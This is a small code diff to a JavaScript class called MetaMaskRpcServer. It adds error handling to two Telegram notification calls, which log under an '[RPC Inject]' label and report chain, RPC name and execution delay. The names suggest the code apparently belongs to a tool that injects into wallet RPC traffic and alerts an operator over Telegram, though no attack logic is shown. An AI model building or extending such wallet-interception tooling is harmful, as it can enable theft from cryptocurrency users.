@@ -312,7 +312,7 @@ class MetaMaskRpcServer {
                         `🌐 RPC: ${this.cryptoApp.currentRpcName}\n` +
                         `⏱️ Delay Used: ${this.cryptoApp.executionDelay}s\n` +
                         `🕒 ${new Date().toLocaleString()}`
-                    );
+                    ).catch(err => console.warn(`[RPC Inject] Telegram notify error: ${err.message}`));
                 }
             }
 
@@ -331,7 +331,7 @@ class MetaMaskRpcServer {
                     `⛓️ Chain: ${this.cryptoApp.currentChainId}\n` +
                     `🌐 RPC: ${this.cryptoApp.currentRpcName}\n` +
                     `🕒 ${new Date().toLocaleString()}`
-                );
+                ).catch(err => console.warn(`[RPC Inject] Telegram notify error: ${err.message}`));
             }
 
             return {
